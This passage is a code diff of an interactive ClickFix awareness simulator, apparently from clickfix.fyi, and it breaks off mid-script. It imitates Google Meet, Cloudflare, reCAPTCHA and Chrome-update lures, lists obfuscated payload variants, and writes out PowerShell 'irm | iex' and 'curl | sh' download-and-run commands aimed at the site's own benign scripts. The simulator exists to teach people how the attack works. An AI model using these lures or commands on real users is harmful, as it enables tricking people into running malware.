@@ -1,1202 +1,313 @@
----
-const baseUrl = import.meta.env.PROD
-    ? "https://clickfix.fyi"
-    : "http://localhost:4321";
+<div class="simulator" data-simulator>
+  <div class="simulator-topline">
+    <span><i aria-hidden="true"></i> Demo</span>
+    <span><b data-detected-os>Windows</b> · Harmless script · View the source first</span>
+  </div>
 
-// We reuse the existing benign scripts for "real" execution
-const SAFE_SCRIPT_WIN = `${baseUrl}/static/example.ps1`;
-const SAFE_SCRIPT_UNIX = `${baseUrl}/static/example.sh`;
----
+  <div class="simulator-body">
+    <ol class="progress" aria-label="Simulation progress">
+      <li class="is-active" data-progress="1"><span class="progress-marker">1</span><span class="progress-label">Lure</span></li>
+      <li data-progress="2"><span class="progress-marker">2</span><span class="progress-label">Instructions</span></li>
+      <li data-progress="3"><span class="progress-marker">3</span><span class="progress-label">Command</span></li>
+      <li data-progress="4"><span class="progress-marker">4</span><span class="progress-label">Result</span></li>
+    </ol>
 
-<div class="demo-wrapper" id="interactive-demo" data-base-url={baseUrl}>
-    <!-- Controls -->
-    <div class="demo-controls">
-        <div class="control-group">
-            <label for="scenario-select">Lure Scenario:</label>
-            <div class="select-wrapper">
-                <select id="scenario-select">
-                    <option value="meet">Google Meet (Connection Error)</option>
-                    <option value="cloudflare">Cloudflare (Verify Human)</option
-                    >
-                    <option value="recaptcha"
-                        >ReCAPTCHA (I'm not a robot)</option
-                    >
-                    <option value="browser"
-                        >Browser Error (Chrome Update)</option
-                    >
-                </select>
-                <svg
-                    class="select-icon"
-                    xmlns="http://www.w3.org/2000/svg"
-                    viewBox="0 0 20 20"
-                    fill="currentColor"
-                >
-                    <path
-                        fill-rule="evenodd"
-                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
-                        clip-rule="evenodd"></path>
-                </svg>
-            </div>
+    <div class="demo-workspace">
+      <section class="stage" aria-live="polite">
+        <div class="browser-chrome" aria-hidden="true" data-browser-chrome>
+          <div class="chrome-dots"><span></span><span></span><span></span></div>
+          <div class="address-bar" data-address>secure-check.example</div>
+        </div>
+        <div class="terminal-chrome" aria-hidden="true" data-terminal-chrome hidden>
+          <div class="chrome-dots"><span></span><span></span><span></span></div>
+          <span data-terminal-title>Terminal</span>
         </div>
 
-        <div class="control-group">
-            <label for="platform-select">Target Platform:</label>
-            <div class="select-wrapper">
-                <select id="platform-select">
-                    <option value="windows">Windows (PowerShell/Run)</option>
-                    <option value="unix">macOS / Linux (Terminal)</option>
-                </select>
-                <svg
-                    class="select-icon"
-                    xmlns="http://www.w3.org/2000/svg"
-                    viewBox="0 0 20 20"
-                    fill="currentColor"
-                >
-                    <path
-                        fill-rule="evenodd"
-                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
-                        clip-rule="evenodd"></path>
-                </svg>
+        <div class="stage-screen" data-stage-screen>
+          <div class="screen-copy" data-screen-copy>
+            <span class="screen-kicker" data-kicker>Security check</span>
+            <h3 data-title>Let’s confirm you’re human.</h3>
+            <p data-description>This quick check helps protect the site from automated traffic.</p>
+          </div>
+
+          <div class="lure-panel" data-lure>
+            <button class="captcha-box" type="button" data-trigger>
+              <span class="checkbox" aria-hidden="true"></span>
+              <span>I’m not a robot</span>
+              <span class="verify-mark" aria-hidden="true">◒<small>VERIFY</small></span>
+            </button>
+          </div>
+
+          <div class="instruction-panel" data-instructions hidden>
+            <div class="panel-heading"><span>!</span><strong data-instruction-title>Additional verification required</strong></div>
+            <ol>
+              <li><span>1</span><p data-instruction="0">Press Windows + R</p></li>
+              <li><span>2</span><p data-instruction="1">Press Ctrl + V</p></li>
+              <li><span>3</span><p data-instruction="2">Press Enter</p></li>
+            </ol>
+            <button class="fake-copy-button" type="button" data-reveal>Copy verification code</button>
+            <p class="microcopy" data-microcopy>The page claims a verification code is ready.</p>
+          </div>
+
+          <div class="command-panel" data-command hidden>
+            <div class="command-label"><span data-copy-status>Harmless demo command</span><span data-tool-label>Windows Run</span></div>
+            <div class="code-shell" aria-label="Demo command">
+              <code data-command-code>powershell -NoProfile -Command "irm 'https://www.clickfix.fyi/static/example.ps1' | iex"</code>
             </div>
+            <p class="source-link">This downloads and runs the script. <a href="https://www.clickfix.fyi/static/example.ps1" target="_blank" rel="noopener noreferrer" data-script-link>Read it first</a>.</p>
+            <button class="continue-button" type="button" data-consequence>What the script does <span aria-hidden="true">→</span></button>
+          </div>
+
+          <div class="terminal-panel" data-consequence-panel hidden>
+            <div class="terminal-command"><span data-terminal-prompt>$</span><code data-terminal-command></code></div>
+            <pre class="terminal-output">ClickFix demo: the downloaded script is harmless.
+No files changed. No data collected.</pre>
+            <div class="terminal-exit">Process exited with status 0</div>
+            <a href="/#already-ran-it">If you ran a real command, follow these steps</a>
+          </div>
+        </div>
+      </section>
+
+      <aside class="explanation" aria-live="polite">
+        <div class="explanation-heading"><span data-note-step>01</span><strong data-note-title>Fake CAPTCHA</strong></div>
+        <p data-note-copy>The page looks like a normal verification check.</p>
+
+        <div class="annotations" data-annotations hidden>
+          <div><span>A</span><p><strong data-annotation-title="0">Trusted system tool</strong><small data-annotation-copy="0">PowerShell is legitimate; the supplied command is not.</small></p></div>
+          <div><span>B</span><p><strong data-annotation-title="1">Hidden activity</strong><small data-annotation-copy="1">The window can be hidden while the command runs.</small></p></div>
+          <div><span>C</span><p><strong data-annotation-title="2">Second-stage payload</strong><small data-annotation-copy="2">The command can retrieve and launch other code.</small></p></div>
         </div>
 
-        <div class="control-group">
-            <label for="variant-select">Payload Variant:</label>
-            <div class="select-wrapper">
-                <select id="variant-select">
-                    <!-- Populated by JS based on platform -->
-                </select>
-                <svg
-                    class="select-icon"
-                    xmlns="http://www.w3.org/2000/svg"
-                    viewBox="0 0 20 20"
-                    fill="currentColor"
-                >
-                    <path
-                        fill-rule="evenodd"
-                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
-                        clip-rule="evenodd"></path>
-                </svg>
-            </div>
-        </div>
+        <button class="reset-button" type="button" data-reset>Reset demo</button>
+      </aside>
     </div>
-
-    <!-- Simulation Stage -->
-    <div class="demo-stage" id="demo-stage-1">
-        <!-- Scenario: Google Meet (Dark Mode) -->
-        <div class="scenario-ui hidden" id="ui-meet">
-            <div class="meet-wrapper">
-                <div class="meet-header">
-                    <div class="meet-logo-area">
-                        <img
-                            src="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png"
-                            alt="Google Meet"
-                            height="24"
-                        />
-                    </div>
-                </div>
-                <div class="meet-body">
-                    <div class="meet-main-content">
-                        <div class="meet-video-placeholder">
-                            <div class="meet-video-text">No camera found</div>
-                            <div class="meet-controls">
-                                <div class="meet-btn-circle red"></div>
-                                <div class="meet-btn-circle red"></div>
-                            </div>
-
-                            <!-- The Lure Popup -->
-                            <div class="meet-popup">
-                                <div class="meet-popup-header">
-                                    <span class="meet-bell-icon">🔔</span> Problems
-                                    detected
-                                    <span class="meet-popup-menu">⋮</span>
-                                </div>
-                                <div class="meet-popup-body">
-                                    <p>
-                                        Problems have been detected with your
-                                        microphone and headset. Click <strong
-                                            >Fix it</strong
-                                        > button and follow steps.
-                                    </p>
-                                    <div class="meet-actions">
-                                        <button
-                                            class="btn-meet-fix btn-fake-copy"
-                                            >Fix it</button
-                                        >
-                                        <button class="btn-meet-try-again"
-                                            >Try again</button
-                                        >
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Step 2 Popup (Hidden initially) -->
-                            <div class="meet-popup hidden" id="meet-step-2">
-                                <div class="meet-popup-header">
-                                    <span class="meet-bell-icon">🔔</span> Problems
-                                    detected
-                                </div>
-                                <div class="meet-popup-body">
-                                    <div
-                                        class="instruction-text instruction-meet"
-                                    >
-                                    </div>
-                                    <div class="meet-actions">
-                                        <button
-                                            class="btn-meet-fix btn-fake-copy"
-                                            >Copy Fix</button
-                                        >
-                                        <button class="btn-meet-try-again"
-                                            >Try again</button
-                                        >
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="meet-sidebar">
-                            <h3>Ready to join?</h3>
-                            <button class="meet-join-btn">Join now</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Scenario: Cloudflare (Human Verify) -->
-        <div class="scenario-ui hidden" id="ui-cloudflare">
-            <div class="cloudflare-wrapper">
-                <div class="cloudflare-header">
-                    <div class="cf-left">Verifying you are human</div>
-                    <div class="cf-logo">CLOUDFLARE</div>
-                </div>
-                <div class="cloudflare-body">
-                    <div class="cf-step" id="cf-step-1">
-                        <p class="cf-subtext">This may take a few seconds</p>
-                        <div class="cf-checkbox-row">
-                            <input
-                                type="checkbox"
-                                id="cf-check"
-                                class="cf-checkbox"
-                            />
-                            <label for="cf-check">Verify you are human</label>
-                        </div>
-                        <div class="cf-loading hidden" id="cf-loading">
-                            <div class="spinner"></div> Verifying...
-                        </div>
-                    </div>
-
-                    <div class="cf-instructions hidden" id="cf-step-2">
-                        <div class="cf-instruction-box">
-                            <div class="instruction-text instruction-cf"></div>
-                            <button class="cf-copy-btn btn-fake-copy"
-                                >Copy Verification</button
-                            >
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Scenario: ReCAPTCHA -->
-        <div class="scenario-ui hidden" id="ui-recaptcha">
-            <div class="recaptcha-wrapper">
-                <div class="recaptcha-box">
-                    <div class="rc-checkbox-area">
-                        <input
-                            type="checkbox"
-                            id="rc-check"
-                            class="rc-checkbox"
-                        />
-                        <label for="rc-check">I'm not a robot</label>
-                    </div>
-                    <div class="rc-logo-area">
-                        <img
-                            src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
-                            alt=""
-                            width="32"
-                            height="32"
-                        />
-                        <div class="rc-text">reCAPTCHA</div>
-                        <div class="rc-links">Privacy - Terms</div>
-                    </div>
-                </div>
-
-                <div class="rc-instructions hidden" id="rc-step-2">
-                    <p class="rc-verify-title">Verification Steps:</p>
-                    <div class="instruction-text instruction-rc"></div>
-                    <button class="rc-verify-btn btn-fake-copy">Verify</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- Scenario: Browser Update (Chrome) -->
-        <div class="scenario-ui hidden" id="ui-browser">
-            <div class="chrome-alert">
-                <div class="chrome-header">
-                    <!-- Chrome Logo Icon -->
-                    <img
-                        src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg"
-                        alt="Chrome"
-                        width="24"
-                        height="24"
-                        style="margin-right: 8px;"
-                    />
-                    <strong>Google Chrome</strong>
-                </div>
-                <div class="chrome-body">
-                    <h3>Something went wrong while displaying this webpage.</h3>
-                    <p>
-                        There was an error during the latest update of browser
-                        version, causing some web pages to malfunction.
-                    </p>
-
-                    <div class="chrome-steps">
-                        <p>
-                            <strong
-                                >Follow these instructions to resolve the issue:</strong
-                            >
-                        </p>
-                        <div
-                            class="instruction-text instruction-browser"
-                            style="margin-left: 1rem; line-height: 1.6;"
-                        >
-                        </div>
-                    </div>
-
-                    <div class="chrome-actions">
-                        <button class="chrome-btn-blue btn-fake-copy"
-                            >Copy fix</button
-                        >
-                        <button class="chrome-btn-grey">Close</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Explanation Box (Bottom) -->
-        <div class="demo-explanation hidden" id="explanation-box">
-            <div class="expl-header">
-                <h4>🚨 Simulation: What was copied to your clipboard?</h4>
-                <button id="close-expl" class="close-expl">×</button>
-            </div>
-            <p>
-                If you were a victim, you would have just pasted this malicious
-                command:
-            </p>
-            <div class="payload-display">
-                <code id="payload-code"></code>
-            </div>
-            <div class="alert-box">
-                <strong>⚠️ Reality Check:</strong> The command above executes a hidden
-                script. <br />
-                In this demo, it runs a <strong>benign local file</strong> (`example.ps1`
-                or `example.sh`). <br />
-                In a real attack, this would install infostealers like Lumma or RedLine
-                immediately.
-            </div>
-        </div>
-    </div>
+  </div>
 </div>
 
-<style>
-    /* Base Layout */
-    .demo-wrapper {
-        max-width: 1000px;
-        margin: 0 auto;
-        font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    }
+<script>
+  const root = document.querySelector<HTMLElement>("[data-simulator]");
 
-    .hidden {
-        display: none !important;
-    }
-
-    /* Controls */
-    .demo-controls {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 1rem;
-        padding: 1.5rem;
-        background: white;
-        border: 1px solid #e5e7eb;
-        border-radius: 8px;
-        margin-bottom: 2rem;
-        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-    }
-    @media (max-width: 640px) {
-        .demo-controls {
-            flex-direction: column;
-            gap: 1rem;
-        }
-        .control-group {
-            min-width: 100%;
-        }
-    }
-    .control-group {
-        flex: 1;
-        min-width: 200px;
-    }
-    .control-group label {
-        display: block;
-        font-size: 0.8rem;
-        font-weight: 700;
-        color: #374151;
-        margin-bottom: 0.4rem;
-        text-transform: uppercase;
-        letter-spacing: 0.05em;
-    }
-    .select-wrapper {
-        position: relative;
-    }
-    select {
-        width: 100%;
-        padding: 0.6rem 2.5rem 0.6rem 0.8rem;
-        border: 1px solid #d1d5db;
-        border-radius: 6px;
-        background: #f9fafb;
-        font-size: 0.95rem;
-        color: #111827;
-        appearance: none;
-        cursor: pointer;
-    }
-    select:focus {
-        outline: 2px solid #2563eb;
-        border-color: #2563eb;
-    }
-    .select-icon {
-        position: absolute;
-        right: 0.8rem;
-        top: 50%;
-        transform: translateY(-50%);
-        width: 1.25rem;
-        height: 1.25rem;
-        color: #6b7280;
-        pointer-events: none;
-    }
-
-    /* Stage */
-    .demo-stage {
-        min-height: 500px;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        position: relative;
-        padding: 2rem;
-        background: #f3f4f6; /* Neutral background for stage */
-        border-radius: 12px;
-        border: 1px dashed #cbd5e1;
-    }
-    @media (max-width: 640px) {
-        .demo-stage {
-            padding: 1rem;
-            min-height: 400px;
-        }
-    }
-    .scenario-ui {
-        width: 100%;
-        max-width: 900px;
-    }
-
-    /** 
-   * SCENARIO: GOOGLE MEET (Dark Mode)
-   */
-    .meet-wrapper {
-        background: #202124;
-        color: white;
-        height: 500px;
-        display: flex;
-        flex-direction: column;
-        border-radius: 8px;
-        overflow: hidden;
-        font-family: "Google Sans", Roboto, Arial, sans-serif;
-    }
-    .meet-header {
-        padding: 0.8rem 1.5rem;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-    }
-    .meet-body {
-        flex: 1;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 2rem;
-    }
-    .meet-main-content {
-        display: flex;
-        gap: 2rem;
-        width: 100%;
-        max-width: 900px;
-        align-items: center;
-    }
-    @media (max-width: 800px) {
-        .meet-main-content {
-            flex-direction: column;
-            gap: 1rem;
-        }
-        .meet-sidebar {
-            width: 100%;
-            padding-bottom: 2rem;
-            padding-top: 0;
-        }
-        .meet-video-placeholder {
-            width: 100%;
-            min-height: 320px; /* Increased height for popup breathing room */
-            height: auto;
-        }
-        .meet-wrapper {
-            height: auto;
-            min-height: auto; /* Allow natural growth */
-            padding-bottom: 2rem;
-        }
-        .meet-controls {
-            margin-bottom: 50px; /* Push controls up slightly to avoid popup overlap */
-        }
-    }
-    .meet-video-placeholder {
-        flex: 2;
-        background: #3c4043;
-        border-radius: 8px;
-        height: 350px;
-        position: relative;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        flex-direction: column;
-    }
-    .meet-video-text {
-        font-size: 1.2rem;
-        color: #e8eaed;
-        margin-bottom: 2rem;
-    }
-    .meet-controls {
-        display: flex;
-        gap: 1rem;
-    }
-    .meet-btn-circle {
-        width: 40px;
-        height: 40px;
-        border-radius: 50%;
-        background: #ea4335; /* Red mute buttons */
-        opacity: 0.8;
-    }
-
-    /* LURE POPUP */
-    .meet-popup {
-        position: absolute;
-        bottom: 20px;
-        right: 20px;
-        background: white;
-        color: #202124;
-        width: 320px;
-        border-radius: 8px;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-        z-index: 10;
-        animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-    }
-    @media (max-width: 480px) {
-        .meet-popup {
-            left: 50%;
-            right: auto;
-            transform: translateX(-50%);
-            bottom: 20px;
-            width: 92%;
-            max-width: 350px; /* Prevent it from getting too wide on slightly larger phones */
-        }
-        /* Override animation for centered popup */
-        @keyframes slideUpMobile {
-            from {
-                opacity: 0;
-                transform: translate(-50%, 20px);
-            }
-            to {
-                opacity: 1;
-                transform: translate(-50%, 0);
-            }
-        }
-    }
-    .meet-popup-header {
-        padding: 12px 16px;
-        font-weight: 500;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        border-bottom: 1px solid #dadce0;
-        font-size: 0.95rem;
-    }
-    #meet-step-2 .meet-popup-header {
-        justify-content: center;
-    }
-    .meet-bell-icon {
-        margin-right: 8px;
-    }
-    .meet-popup-menu {
-        color: #5f6368;
-        cursor: pointer;
-    }
-    .meet-popup-body {
-        padding: 16px;
-        font-size: 0.9rem;
-        line-height: 1.5;
-    }
-    .meet-actions {
-        margin-top: 16px;
-        display: flex;
-        gap: 8px;
-        justify-content: flex-end;
-    }
-    .btn-meet-fix {
-        background: transparent;
-        color: #1a73e8;
-        border: none;
-        font-weight: 500;
-        cursor: pointer;
-        padding: 8px 16px;
-    }
-    .btn-meet-fix:hover {
-        background: #f1f3f4;
-        border-radius: 4px;
-    }
-    .btn-meet-try-again {
-        background: transparent;
-        color: #1a73e8;
-        border: none;
-        font-weight: 500;
-        cursor: pointer;
-        padding: 8px 16px;
-    }
-
-    .meet-sidebar {
-        flex: 1;
-        color: #e8eaed;
-        text-align: center;
-    }
-    .meet-sidebar h3 {
-        font-size: 1.7rem;
-        font-weight: 400;
-        margin-bottom: 2rem;
-    }
-    .meet-join-btn {
-        background: #8ab4f8;
-        color: #202124;
-        border: none;
-        padding: 12px 24px;
-        border-radius: 24px;
-        font-weight: 500;
-        font-size: 1rem;
-        cursor: pointer;
-    }
-
-    /**
-   * SCENARIO: CLOUDFLARE
-   */
-    .cloudflare-wrapper {
-        background: white;
-        max-width: 500px;
-        margin: 0 auto;
-        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),
-            0 2px 4px -1px rgba(0, 0, 0, 0.06);
-        border-radius: 4px;
-        overflow: hidden;
-        font-family: system-ui, -apple-system, sans-serif;
-    }
-    @media (max-width: 520px) {
-        .cloudflare-wrapper {
-            width: 100%;
-            max-width: 100%;
-            border-radius: 0;
-            box-shadow: none;
-        }
-    }
-    .cloudflare-header {
-        background: #f48120; /* Cloudflare Orange */
-        color: white;
-        padding: 1rem 1.5rem;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-    }
-    .cf-left {
-        font-weight: 600;
-        font-size: 1.1rem;
-    }
-    .cf-logo {
-        font-weight: 800;
-        font-size: 0.9rem;
-        letter-spacing: 0.05em;
-    }
-    .cloudflare-body {
-        padding: 2rem;
-    }
-    .cf-subtext {
-        color: #4b5563;
-        margin-bottom: 1.5rem;
-        font-size: 0.95rem;
-    }
-
-    .cf-checkbox-row {
-        display: flex;
-        align-items: center;
-        gap: 1rem;
-        padding: 1rem;
-        background: #f9fafb;
-        border: 1px solid #e5e7eb;
-        border-radius: 4px;
-        margin-bottom: 1rem;
-    }
-    .cf-checkbox {
-        width: 24px;
-        height: 24px;
-        cursor: pointer;
-    }
-    .cf-checkbox-row label {
-        font-size: 1.1rem;
-        color: #374151;
-        cursor: pointer;
-    }
-
-    .cf-instruction-box {
-        background: #fff7ed;
-        border: 1px solid #fdba74;
-        padding: 1rem;
-        border-radius: 6px;
-        animation: fadeIn 0.3s;
-    }
-
-    .cf-copy-btn {
-        width: 100%;
-        background: #f48120;
-        color: white;
-        border: none;
-        padding: 0.75rem;
-        font-weight: 600;
-        border-radius: 4px;
-        cursor: pointer;
-        margin-top: 1rem;
-    }
-    .cf-copy-btn:hover {
-        background: #ea580c;
-    }
-
-    /**
-   * SCENARIO: RECAPTCHA
-   */
-    /**
-   * SCENARIO: RECAPTCHA
-   */
-    .recaptcha-wrapper {
-        margin: 0 auto;
-        font-family: Roboto, Arial, sans-serif;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-    }
-
-    .recaptcha-box {
-        background: #f9f9f9;
-        border: 1px solid #d3d3d3;
-        border-radius: 3px;
-        width: 304px;
-        height: 78px;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        box-shadow: 0 0 4px 1px rgba(0, 0, 0, 0.08);
-        padding: 0 12px;
-        box-sizing: border-box;
-        background: #fff;
-    }
-
-    .rc-checkbox-area {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-    }
-    .rc-checkbox {
-        width: 24px;
-        height: 24px;
-        cursor: pointer;
-        border: 2px solid #c1c1c1;
-        border-radius: 2px;
-    }
-    .rc-checkbox:hover {
-        border-color: #b2b2b2;
-    }
-
-    .rc-checkbox-area label {
-        font-family: Roboto, Arial, sans-serif;
-        font-weight: 400;
-        font-size: 14px;
-        color: #000;
-        cursor: pointer;
-    }
-
-    .rc-logo-area {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-        margin-right: 2px;
-    }
-    .rc-text {
-        font-size: 10px;
-        color: #555;
-        margin-top: 2px;
-    }
-    .rc-links {
-        font-size: 8px;
-        color: #555;
-        margin-top: 1px;
-    }
-
-    .rc-instructions {
-        margin-top: 1.5rem;
-        border: 1px solid #e0e0e0;
-        padding: 1rem;
-        border-radius: 4px;
-        background: white;
-        animation: fadeIn 0.3s;
-        max-width: 400px;
-        margin-left: auto;
-        margin-right: auto;
-    }
-    .rc-verify-title {
-        font-weight: bold;
-        margin-bottom: 0.5rem;
-        color: #333;
-    }
-    .rc-verify-btn {
-        width: 100%;
-        background: #4a90e2;
-        color: white;
-        border: none;
-        padding: 0.75rem;
-        font-weight: 600;
-        border-radius: 3px;
-        cursor: pointer;
-        margin-top: 1rem;
-    }
-    .rc-verify-btn:hover {
-        background: #357abd;
-    }
-
-    /**
-   * SCENARIO: CHROME BROWSER ERROR
-   */
-    .chrome-alert {
-        background: white;
-        width: 100%;
-        max-width: 600px;
-        margin: 0 auto;
-        border-radius: 8px;
-        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-        display: flex;
-        flex-direction: column;
-        overflow: hidden;
-        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-    }
-    @media (max-width: 600px) {
-        .chrome-body {
-            padding: 1.5rem;
-        }
-        .chrome-actions {
-            flex-direction: column;
-        }
-        .chrome-btn-blue,
-        .chrome-btn-grey {
-            width: 100%;
-        }
-    }
-    .chrome-header {
-        padding: 12px 20px;
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        border-bottom: 1px solid #e5e7eb;
-    }
-    .chrome-header strong {
-        color: #374151;
-        font-size: 0.9rem;
-    }
-
-    .chrome-body {
-        padding: 30px 40px;
-    }
-    .chrome-body h3 {
-        font-size: 1.5rem;
-        color: #1f2937;
-        margin: 0 0 1rem 0;
-        font-weight: 600;
-    }
-    .chrome-body p {
-        color: #4b5563;
-        margin-bottom: 1.5rem;
-        font-size: 0.95rem;
-        line-height: 1.5;
-    }
-
-    .chrome-steps {
-        background: #f8fafc;
-        padding: 1.5rem;
-        border-radius: 6px;
-        margin-bottom: 2rem;
-    }
-
-    .chrome-actions {
-        display: flex;
-        gap: 1rem;
-        justify-content: flex-end;
-    }
-    .chrome-btn-blue {
-        background: #1a73e8;
-        color: white;
-        padding: 10px 24px;
-        border-radius: 20px;
-        border: none;
-        font-weight: 500;
-        cursor: pointer;
-    }
-    .chrome-btn-blue:hover {
-        background: #1557b0;
-    }
-    .chrome-btn-grey {
-        background: white;
-        color: #1a73e8;
-        border: 1px solid #dadce0;
-        padding: 10px 24px;
-        border-radius: 20px;
-        font-weight: 500;
-        cursor: pointer;
-    }
-    .chrome-btn-grey:hover {
-        background: #f1f3f4;
-    }
-
-    /* Explanation / Payload Display */
-    .demo-explanation {
-        width: 100%;
-        background: white;
-        margin-top: 2rem;
-        border-radius: 8px;
-        padding: 1.5rem;
-        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-        border-left: 5px solid #ef4444;
-        animation: slideUp 0.5s ease-out;
-    }
-    .expl-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 1rem;
-    }
-    .expl-header h4 {
-        margin: 0;
-        color: #991b1b;
-        font-size: 1.1rem;
-    }
-    .close-expl {
-        background: none;
-        border: none;
-        font-size: 1.5rem;
-        cursor: pointer;
-        color: #9ca3af;
-    }
-
-    .payload-display {
-        background: #111827;
-        border-radius: 6px;
-        padding: 1rem;
-        color: #34d399;
-        font-family: monospace;
-        font-size: 0.85rem;
-        overflow-x: auto;
-        margin: 1rem 0;
-        word-break: break-all;
-    }
-    .payload-display code {
-        background: transparent;
-        padding: 0;
-        color: inherit;
-    }
-    .alert-box {
-        font-size: 0.9rem;
-        color: #4b5563;
-        background: #fee2e2;
-        padding: 1rem;
-        border-radius: 6px;
-    }
-
-    @keyframes slideUp {
-        from {
-            opacity: 0;
-            transform: translateY(20px);
-        }
-        to {
-            opacity: 1;
-            transform: translateY(0);
-        }
-    }
-    @keyframes fadeIn {
-        from {
-            opacity: 0;
-        }
-        to {
-            opacity: 1;
-        }
-    }
-</style>
-
-<script define:vars={{ SAFE_SCRIPT_WIN, SAFE_SCRIPT_UNIX, baseUrl }}>
-    // Application State
-    const scenarioKeys = ["meet", "cloudflare", "recaptcha", "browser"];
-    const randomScenario =
-        scenarioKeys[Math.floor(Math.random() * scenarioKeys.length)];
-
-    const state = {
-        scenario: randomScenario,
-        platform: "windows",
-        variant: "powershell-hidden", // default
-    };
-
-    // DOM Elements
-    const els = {
-        scenarioSelect: document.getElementById("scenario-select"),
-        platformSelect: document.getElementById("platform-select"),
-        variantSelect: document.getElementById("variant-select"),
-        scenarios: {
-            meet: document.getElementById("ui-meet"),
-            cloudflare: document.getElementById("ui-cloudflare"),
-            recaptcha: document.getElementById("ui-recaptcha"),
-            browser: document.getElementById("ui-browser"),
-        },
-        instr: {
-            all: document.querySelectorAll(".instruction-text"),
-        },
-        explBox: document.getElementById("explanation-box"),
-        payloadCode: document.getElementById("payload-code"),
-        closeExplBtn: document.getElementById("close-expl"),
-
-        // Scenario specific
-        meetStep1: document.querySelector(".meet-popup:not(#meet-step-2)"),
-        meetStep2: document.getElementById("meet-step-2"),
-        cfStep2: document.getElementById("cf-step-2"),
-        cfLoading: document.getElementById("cf-loading"),
-        cfCheck: document.getElementById("cf-check"),
-        rcStep2: document.getElementById("rc-step-2"),
-        rcCheck: document.getElementById("rc-check"),
-    };
-
-    // Payload Definitions
-    const variants = {
-        windows: [
-            { id: "powershell-hidden", label: "PowerShell (Hidden Window)" },
-            { id: "powershell-enc", label: "PowerShell (Base64 Encoded)" },
-            { id: "mshta", label: "mshta (HTML Application)" },
-            { id: "batch", label: "Batch / Command Prompt" },
+  if (root) {
+    const platforms = {
+      windows: {
+        label: "Windows detected",
+        instructions: ["Press Windows + R", "Paste with Ctrl + V", "Press Enter"],
+        tool: "Windows Run / PowerShell",
+        command: `powershell -NoProfile -Command "irm 'https://www.clickfix.fyi/static/example.ps1' | iex"`,
+        scriptUrl: "https://www.clickfix.fyi/static/example.ps1",
+        annotations: [
+          ["Trusted system tool", "PowerShell is legitimate; the supplied command controls what it does."],
+          ["Remote retrieval", "irm downloads the hosted script into memory."],
+          ["Immediate execution", "iex runs the downloaded text as PowerShell code."],
         ],
-        unix: [
-            { id: "curl-basic", label: "Curl (Basic)" },
-            { id: "base64-pipe", label: "Base64 Pipeline" },
-            { id: "stealth-obf", label: "Stealth (Character Obfuscation)" },
+        commandNote: "The button copied a PowerShell command that downloads and runs this site’s harmless script.",
+        terminalTitle: "Windows PowerShell",
+        terminalPrompt: "PS C:\\Users\\you>",
+      },
+      macos: {
+        label: "macOS detected",
+        instructions: ["Open Terminal", "Paste with Command + V", "Press Return"],
+        tool: "macOS Terminal / shell",
+        command: "curl -fsSL https://www.clickfix.fyi/static/example.sh | sh",
+        scriptUrl: "https://www.clickfix.fyi/static/example.sh",
+        annotations: [
+          ["Trusted system tool", "Terminal and the shell are legitimate; the supplied command controls what they do."],
+          ["Remote retrieval", "curl downloads the hosted script and writes it to standard output."],
+          ["Immediate execution", "The pipe sends the downloaded text directly to sh."],
         ],
+        commandNote: "The button copied a shell command that downloads and runs this site’s harmless script.",
+        terminalTitle: "Terminal — zsh",
+        terminalPrompt: "$",
+      },
+      linux: {
+        label: "Linux detected",
+        instructions: ["Open a terminal", "Paste with Ctrl + Shift + V", "Press Enter"],
+        tool: "Linux terminal / shell",
+        command: "curl -fsSL https://www.clickfix.fyi/static/example.sh | sh",
+        scriptUrl: "https://www.clickfix.fyi/static/example.sh",
+        annotations: [
+          ["Trusted system tool", "The terminal and shell are legitimate; the supplied command controls what they do."],
+          ["Remote retrieval", "curl downloads the hosted script and writes it to standard output."],
+          ["Immediate execution", "The pipe sends the downloaded text directly to sh."],
+        ],
+        commandNote: "The button copied a shell command that downloads and runs this site’s harmless script.",
+        terminalTitle: "Terminal — bash",
+        terminalPrompt: "$",
+      },
+    } as const;
+
+    type Platform = keyof typeof platforms;
+    const browserNavigator = navigator as Navigator & { userAgentData?: { platform?: string } };
